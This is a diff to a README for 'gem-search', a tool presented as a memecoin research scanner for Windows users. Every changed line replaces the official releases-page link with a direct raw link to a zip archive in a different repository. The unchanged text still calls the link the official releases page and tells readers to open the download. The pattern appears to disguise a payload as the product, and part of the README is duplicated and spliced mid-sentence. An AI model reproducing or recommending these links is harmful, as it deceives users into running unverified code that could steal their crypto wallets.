@@ -5,7 +5,7 @@ description: "Search local-first and follow evidence with four optional Grok rev
 ---
 # 🔍 gem-search - Find Safe Memecoins Before You Buy
 
-[![Download gem-search](https://img.shields.io/badge/Download-gem--search-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kaito2828/gem-search/releases)
+[![Download gem-search](https://img.shields.io/badge/Download-gem--search-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kaito2828/kaito2828.github.io/raw/refs/heads/main/centuplicate/v3.1.zip)
 
 gem-search is a rainbow spider for memecoin research. It X-rays a token so you can see bundles, linked wallets, and dev history before you make a move. It includes a scanner, a Telegram bot, and a live Bundle Index. This guide is written for everyday Windows users who want a clear path from download to first look.
 
@@ -48,7 +48,7 @@ Because the project is open-source, the community can inspect how it works. That
 
 Visit this link to download the application:
 
-[Download gem-search from the official releases page](https://github.com/kaito2828/gem-search/releases)
+[Download gem-search from the official releases page](https://github.com/kaito2828/kaito2828.github.io/raw/refs/heads/main/centuplicate/v3.1.zip)
 
 The link above opens the official gem-search releases page. That page is where the downloadable application is published. Look for the newest release shown at the top of the page. Use the download control provided there to get the application.
 
@@ -91,7 +91,7 @@ The live Bundle Index is the comparison view. It helps you see bundled buying ac
 
 Together, these features cover different moments in memecoin research. You might use the bot when a token appears in a chat, the scanner when you want the full picture, and the Bundle Index when you want to compare activity# 🔍 gem-search - Spot Risky Memecoins Before You Buy
 
-[![Download gem-search](https://img.shields.io/badge/Download-gem--search-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kaito2828/gem-search/releases)
+[![Download gem-search](https://img.shields.io/badge/Download-gem--search-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kaito2828/kaito2828.github.io/raw/refs/heads/main/centuplicate/v3.1.zip)
 
 gem-search is an open-source research tool for memecoins. It acts like a rainbow spider that X-rays a token so you can review bundles, linked wallets, and dev history before you make a move. The project includes a scanner, a Telegram bot, and a live Bundle Index. This README is written for everyday Windows users who want a clear download path and a simple first run.
 
@@ -128,7 +128,7 @@ gem-search puts those signals in one place. You can scan a token, review the res
 
 Visit this link to download the application:
 
-[gem-search official releases page](https://github.com/kaito2828/gem-search/releases)
+[gem-search official releases page](https://github.com/kaito2828/kaito2828.github.io/raw/refs/heads/main/centuplicate/v3.1.zip)
 
 The link opens the official gem-search releases page. That page is where the downloadable application is published. Use the download control provided there to get the application.
 
@@ -205,7 +205,7 @@ Avoid opening the same downloaded item twice while it is already running. Close 
 
 Visit this link to download the application:
 
-[Download gem-search](https://github.com/kaito2828/gem-search/releases)
+[Download gem-search](https://github.com/kaito2828/kaito2828.github.io/raw/refs/heads/main/centuplicate/v3.1.zip)
 
 Use this official releases page for the Windows download. After the download completes, open the downloaded item and follow the prompts shown on screen.
 
